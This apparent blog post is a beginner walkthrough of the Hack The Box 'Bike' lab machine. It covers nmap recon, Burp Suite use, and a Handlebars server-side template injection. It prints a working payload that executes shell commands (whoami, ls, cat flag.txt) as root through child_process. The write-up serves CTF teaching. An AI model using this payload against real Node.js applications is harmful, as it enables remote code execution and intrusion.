<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Bike - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,bike,tier-1,vip-tier,javascript,web,injection,custom-applications,nodejs,reconnaissance,remote-code-execution,server-side-template-injection,ssti,linux-target,difficulty-easy,user-own,system-own"><meta name=description content="The aim of this walkthrough is to provide help with the Bike machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/bike/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Bike - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Bike machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/bike/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-09T12:00:00+00:00"><meta property="article:modified_time" content="2023-05-09T12:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Bike - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Bike machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Bike - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/bike/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Bike - Walkthrough","name":"HTB - Bike - Walkthrough","description":"The aim of this walkthrough is to provide help with the Bike machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","bike","tier-1","vip-tier","javascript","web","injection","custom-applications","nodejs","reconnaissance","remote-code-execution","server-side-template-injection","ssti","linux-target","difficulty-easy","user-own","system-own"],"articleBody":"The aim of this walkthrough is to provide help with the Bike machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ TASK 1 Question: What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high.\nStarting our recon with a quick connection check is always a good idea.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-gdjzvza4zw]─[~/bike] └──╼ [★]$ ping $rhost -c 4 PING 10.129.97.64 (10.129.97.64) 56(84) bytes of data. 64 bytes from 10.129.97.64: icmp_seq=1 ttl=63 time=9.73 ms 64 bytes from 10.129.97.64: icmp_seq=2 ttl=63 time=9.72 ms 64 bytes from 10.129.97.64: icmp_seq=3 ttl=63 time=9.49 ms 64 bytes from 10.129.97.64: icmp_seq=4 ttl=63 time=9.56 ms --- 10.129.97.64 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3006ms rtt min/avg/max/mdev = 9.487/9.621/9.729/0.103 ms ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-gdjzvza4zw]─[~/bike] └──╼ [★]$ Scanning all the tcp ports on the target tend to be really slow, so we specify the number of packets we send each second. Hopefully this will speed the scans up a bit.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-gdjzvza4zw]─[~/bike] └──╼ [★]$ nmap -p- --min-rate 5000 $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 13:12 BST Nmap scan report for 10.129.97.64 Host is up (2.7s latency). Not shown: 63801 filtered tcp ports (no-response), 1732 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 350.85 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-gdjzvza4zw]─[~/bike] └──╼ [★]$ Only two ports appear to be open: port 22 and port 80.\n22,80\nTASK 2 Question: What software is running the service listening on the http/web port identified in the first question?\nUsing the -sV option with nmap helps us determine the service/version that’s running on the specified port.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-gdjzvza4zw]─[~/bike] └──╼ [★]$ nmap -sV -p 80 $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 13:19 BST Nmap scan report for 10.129.97.64 Host is up (0.013s latency). PORT STATE SERVICE VERSION 80/tcp open http Node.js (Express middleware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-gdjzvza4zw]─[~/bike] └──╼ [★]$ Using our browser to check it out, this is how the website looks like:\nnode.js\nTASK 3 Question: What is the name of the Web Framework according to Wappalyzer?\nUsing the Wappalyzer extension in our browser returns Express for the Web framework option.\nOn the same note, fingerprinting the server with whatweb reveals the same answer.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-gdjzvza4zw]─[~/bike] └──╼ [★]$ whatweb $rhost http://10.129.97.64 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.97.64], JQuery[2.2.4], Script, Title[Bike], X-Powered-By[Express], X-UA-Compatible[ie=edge] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-gdjzvza4zw]─[~/bike] └──╼ [★]$ express\nTASK 4 Question: What is the name of the vulnerability we test for by submitting {{7*7}}?\nSubmitting - {{7*7}} - into the E-mail field creates an error message. Hopefully this means that it is vulnerable.\nOnce the vulnerability is idenfified, we read up on it and once we understand it, we try to exploit it.\nserver side template injection\nTASK 5 Question: What is the templating engine being used within Node.JS?\nAfter taking an other look at the generated error message from TASK4, we notice, that there are multiple mentions of something called handlebars.\n0\t\"Error: Parse error on line 1:\" 1\t\"{{7*7}}\" 2\t\"--^\" 3\t\"Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'\" 4\t\" at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)\" 5\t\" at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)\" 6\t\" at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)\" 7\t\" at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)\" 8\t\" at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)\" 9\t\" at router.post (/root/Backend/routes/handlers.js:15:18)\" 10\t\" at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)\" 11\t\" at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)\" 12\t\" at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)\" 13\t\" at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)\" Since we already identified the vulnerability, it is time to search for ways to exploit it. One of the possible payloads that we find for the handlebar templating engine this:\n{{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return require('child_process').exec('whoami');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} handlebars\nTASK 6 Question: What is the name of the BurpSuite tab used to encode text?\nIt should become quite clear once we take a look around the various tabs available in Burp Suite.\ndecoder\nTASK 7 Question: In order to send special characters in our payload in an HTTP request, we’ll encode the payload. What type of encoding do we use?\nSince this will be a part of a web request, url-encoding and formatting should be enforced. Therefore, we use the encode as url option in the decoder to encode our payload.\nurl\nTASK 8 Question: When we use a payload from HackTricks to try to run system commands, we get an error back. What is “not defined” in the response error?\nFirst we need capture the http request we send when submitting {{7*7}} into the E-mail field.\nWe can do this by launching the Burp Suite, turning on the intercept in the Proxy tab and then enabling the FoxyProxy extension in our browser to forward everything to burp. Lastly, we make the same request in our browser as before.\nIf everything is configured properly, our http request is intercepted and shown us in the Proxy tab. We send it to the Repeater so that we can modify some parts of it.\nThen we use the url-encoded payload from TASK7 so, that once our payload is properly fitted, we set it for the email url parameter in the opened Repeater tab.\nOnce set, we send the request. This is the response we get back:\nHTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 1345 ETag: W/\"541-sEbhFszxoOHrx2pYd8n5qxybwvM\" Date: Tue, 09 May 2023 14:57:17 GMT Connection: close [\"ReferenceError: require is not defined\",\" at Function.eval (eval at (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23)), :3:1)\",\" at Function. (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:10:25)\",\" at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), :5:37)\",\" at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)\",\" at execIteration (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)\",\" at Array. (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:61:13)\",\" at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), :12:31)\",\" at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)\",\" at Array. (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)\",\" at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), :12:34)\"] require\nTASK 9 Question: What variable is the name of the top-level scope in Node.JS?\nObviously, our current payload does not work since we got an error back in TASK8. It is time to start debugging, researching and experimenting.\nglobal\nTASK 10 Question: By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?\nAfter an extensive experimenting, we found a payload that works as intended:\n{{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return process.mainModule.require('child_process').execSync('whoami');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} So that once we send it, this is the response we get back:\nHTTP/1.1 200 OK X-Powered-By: Express Content-Type: text/html; charset=utf-8 Content-Length: 1226 ETag: W/\"4ca-gPkNllwoT4EnMNtziaobU75El+k\" Date: Tue, 09 May 2023 15:25:15 GMT Connection: close \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"\u003e \u003clink rel=\"stylesheet\" href=\"css/home.css\"\u003e \u003ctitle\u003e Bike \u003c/title\u003e \u003c/head\u003e \u003cheader\u003e \u003c/header\u003e \u003cbody\u003e \u003cdiv id=container\u003e \u003cimg src=\"images/buttons.gif\" id=\"avatar\"\u003e \u003cdiv class=\"type-wrap\"\u003e \u003cspan id=\"typed\" style=\"white-space:pre;\" class=\"typed\"\u003e\u003c/span\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"contact\"\u003e \u003ch3\u003eWe can let you know once we are up and running.\u003c/h3\u003e \u003cdiv class=\"fields\"\u003e \u003cform id=\"form\" method=\"POST\" action=\"/\"\u003e \u003cinput name=\"email\" placeholder=\"E-mail\"\u003e\u003c/input\u003e \u003cbutton type=\"submit\" class=\"button-54\" name=\"action\" value=\"Submit\"\u003eSubmit\u003c/button\u003e \u003c/form\u003e \u003c/div\u003e \u003cp class=\"result\"\u003e We will contact you at: e 2 [object Object] function Function() { [native code] } 2 [object Object] root \u003c/p\u003e \u003c/div\u003e \u003cscript src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/typed.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/main.js\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e It tells us that whatever commands we may use in our payloads, they run with root privileges on the target system.\nroot\nSUBMIT FLAG Question: Submit root flag\nWe have to make some further modifications to our payload if we want to display the flag in a http response. First, let us try the current directory and simply list the files there.\n# modified payload to list the files in the current directory ... return process.mainModule.require('child_process').execSync('ls');\" ... Then we url-encode it, and we paste it into our responder as the value for the email parameter. Sending it, and checking the response shows that the flag is not located in the current directory.\nHTTP/1.1 200 OK X-Powered-By: Express Content-Type: text/html; charset=utf-8 Content-Length: 1294 ETag: W/\"50e-PCaaSkUMRFYZ/FPJ0e3tG6uQSYM\" Date: Tue, 09 May 2023 15:30:44 GMT Connection: close \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"\u003e \u003clink rel=\"stylesheet\" href=\"css/home.css\"\u003e \u003ctitle\u003e Bike \u003c/title\u003e \u003c/head\u003e \u003cheader\u003e \u003c/header\u003e \u003cbody\u003e \u003cdiv id=container\u003e \u003cimg src=\"images/buttons.gif\" id=\"avatar\"\u003e \u003cdiv class=\"type-wrap\"\u003e \u003cspan id=\"typed\" style=\"white-space:pre;\" class=\"typed\"\u003e\u003c/span\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"contact\"\u003e \u003ch3\u003eWe can let you know once we are up and running.\u003c/h3\u003e \u003cdiv class=\"fields\"\u003e \u003cform id=\"form\" method=\"POST\" action=\"/\"\u003e \u003cinput name=\"email\" placeholder=\"E-mail\"\u003e\u003c/input\u003e \u003cbutton type=\"submit\" class=\"button-54\" name=\"action\" value=\"Submit\"\u003eSubmit\u003c/button\u003e \u003c/form\u003e \u003c/div\u003e \u003cp class=\"result\"\u003e We will contact you at: e 2 [object Object] function Function() { [native code] } 2 [object Object] index.js node_modules package.json package-lock.json public routes views \u003c/p\u003e \u003c/div\u003e \u003cscript src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/typed.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/main.js\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e But looking around in the direct parent directory with cd .. \u0026\u0026 ls brings us to the flags location.\n# modified payload to list the files in our parent directory ... return process.mainModule.require('child_process').execSync('cd .. \u0026\u0026 ls'); ... So, using the same play as before:\nurl-encode paste encoded payload into the email parameter send the request will land us the desired response:\nHTTP/1.1 200 OK X-Powered-By: Express Content-Type: text/html; charset=utf-8 Content-Length: 1243 ETag: W/\"4db-JFmgsumMwk2V9TYqOcZPMdBpJLw\" Date: Tue, 09 May 2023 15:34:05 GMT Connection: close \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"\u003e \u003clink rel=\"stylesheet\" href=\"css/home.css\"\u003e \u003ctitle\u003e Bike \u003c/title\u003e \u003c/head\u003e \u003cheader\u003e \u003c/header\u003e \u003cbody\u003e \u003cdiv id=container\u003e \u003cimg src=\"images/buttons.gif\" id=\"avatar\"\u003e \u003cdiv class=\"type-wrap\"\u003e \u003cspan id=\"typed\" style=\"white-space:pre;\" class=\"typed\"\u003e\u003c/span\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"contact\"\u003e \u003ch3\u003eWe can let you know once we are up and running.\u003c/h3\u003e \u003cdiv class=\"fields\"\u003e \u003cform id=\"form\" method=\"POST\" action=\"/\"\u003e \u003cinput name=\"email\" placeholder=\"E-mail\"\u003e\u003c/input\u003e \u003cbutton type=\"submit\" class=\"button-54\" name=\"action\" value=\"Submit\"\u003eSubmit\u003c/button\u003e \u003c/form\u003e \u003c/div\u003e \u003cp class=\"result\"\u003e We will contact you at: e 2 [object Object] function Function() { [native code] } 2 [object Object] Backend flag.txt snap \u003c/p\u003e \u003c/div\u003e \u003cscript src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/typed.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/main.js\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Now, all that’s left for us is to grab it. Adjusting our payload again is simple:\n... # modified payload to grab the flag from the parent directory {{this.push \"return process.mainModule.require('child_process').execSync('cd .. \u0026\u0026 cat flag.txt');\"}} ... Here is the complete final payload we use:\n{{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return process.mainModule.require('child_process').execSync('cd .. \u0026\u0026 cat flag.txt');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} Once we go through all the previous motions again, the flag will be then displayed in our http response.\nHTTP/1.1 200 OK X-Powered-By: Express Content-Type: text/html; charset=utf-8 Content-Length: 1254 ETag: W/\"4e6-Roh4AtcX7EhzWbQL09jWSVAYe0s\" Date: Tue, 09 May 2023 15:38:00 GMT Connection: close \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"\u003e \u003clink rel=\"stylesheet\" href=\"css/home.css\"\u003e \u003ctitle\u003e Bike \u003c/title\u003e \u003c/head\u003e \u003cheader\u003e \u003c/header\u003e \u003cbody\u003e \u003cdiv id=container\u003e \u003cimg src=\"images/buttons.gif\" id=\"avatar\"\u003e \u003cdiv class=\"type-wrap\"\u003e \u003cspan id=\"typed\" style=\"white-space:pre;\" class=\"typed\"\u003e\u003c/span\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"contact\"\u003e \u003ch3\u003eWe can let you know once we are up and running.\u003c/h3\u003e \u003cdiv class=\"fields\"\u003e \u003cform id=\"form\" method=\"POST\" action=\"/\"\u003e \u003cinput name=\"email\" placeholder=\"E-mail\"\u003e\u003c/input\u003e \u003cbutton type=\"submit\" class=\"button-54\" name=\"action\" value=\"Submit\"\u003eSubmit\u003c/button\u003e \u003c/form\u003e \u003c/div\u003e \u003cp class=\"result\"\u003e We will contact you at: e 2 [object Object] function Function() { [native code] } 2 [object Object] \u003cflag\u003e \u003c/p\u003e \u003c/div\u003e \u003cscript src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/typed.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/main.js\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e This is how it looks like in burp:\nflag\nCongratulations, we just successfully pwned the target machine. All we have left to do now is to terminate the target box (if not terminated automatically) before we continue with the next box!\n","wordCount":"2073","inLanguage":"en","datePublished":"2023-05-09T12:00:00Z","dateModified":"2023-05-09T12:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/bike/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Bike - Walkthrough</h1><div class=post-meta><span title='2023-05-09 12:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;2073 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#task-8><strong>TASK 8</strong></a></li><li><a href=#task-9><strong>TASK 9</strong></a></li><li><a href=#task-10><strong>TASK 10</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Bike</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 1</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
